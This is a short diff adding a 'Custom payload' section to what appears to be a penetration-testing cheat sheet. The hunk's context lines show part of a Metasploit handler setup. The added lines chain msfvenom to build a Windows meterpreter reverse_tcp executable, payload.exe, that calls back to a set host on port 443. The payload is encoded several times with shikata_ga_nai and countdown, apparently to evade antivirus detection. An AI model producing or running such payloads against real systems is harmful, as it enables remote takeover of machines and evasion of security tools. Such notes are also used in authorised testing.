@@ -49,3 +49,12 @@ set lhost 10.0.0.1;
 set lport 443;
 exploit -j"
 ```
+
+
+## Custom payload
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
+    msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+    msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+    
+ 
